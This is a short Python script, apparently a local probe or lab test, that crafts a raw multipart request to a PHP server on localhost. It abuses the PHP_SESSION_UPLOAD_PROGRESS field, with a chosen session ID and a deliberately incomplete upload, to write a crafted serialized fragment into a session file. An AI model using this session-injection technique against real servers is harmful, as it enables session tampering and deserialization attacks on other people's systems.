#!/usr/bin/env python3
import socket, sys, time
HOST='127.0.0.1'; PORT=8088; BND=b'B'*10
KEY=b'X|E:20:"AAAAAAAAAAAAAAAAAAAA";'
o=bytearray()
def part(name,data,fn=None,close=True):
    global o
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+name.encode()+b'"'
    if fn: o+=b'; filename="'+fn[0].encode()+b'"\r\nContent-Type: '+fn[1].encode()+b'\r\n\r\n'
    else: o+=b'\r\n\r\n'
    o+=data
    if close: o+=b'\r\n'
part('PHPSESSID', b'injtest0002')
part('PHP_SESSION_UPLOAD_PROGRESS', KEY)
part('f', b'hello-upload-data'*4, ('a.txt','text/plain'), close=False)
body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: 100000\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(2)
s.sendall(h+body)
time.sleep(0.5)
s.close()
